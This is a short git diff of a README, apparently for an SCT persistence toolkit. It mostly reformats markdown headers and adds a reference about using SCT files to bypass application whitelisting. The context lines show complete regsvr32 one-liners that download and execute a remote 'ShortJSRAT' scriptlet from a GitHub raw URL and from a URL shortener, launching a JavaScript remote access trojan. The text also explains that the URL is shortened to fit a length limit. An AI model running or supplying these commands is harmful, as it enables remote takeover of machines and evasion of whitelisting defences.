@@ -82,7 +82,7 @@ ref.Exec();`
 
 
 ---
-###Usage:
+### Usage:
 
 1.(local)
 
@@ -103,13 +103,13 @@ or (remote)
 ---
 ---
 
-##ShortJSRAT
+## ShortJSRAT
 You can run the following code to start JSRAT:
 
 
 `regsvr32 /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/ShortJSRAT.sct scrobj.dll`
 
-###Why create this:
+### Why create this:
 
 Limit command length to 260 characters.
 
@@ -129,7 +129,9 @@ Google url shortener,like this:
 `regsvr32 /s /n /u /i:https://goo.gl/ijB12k scrobj.dll`
 
 
+Details:
 
+《Use SCT to Bypass Application Whitelisting Protection》
 
 
 
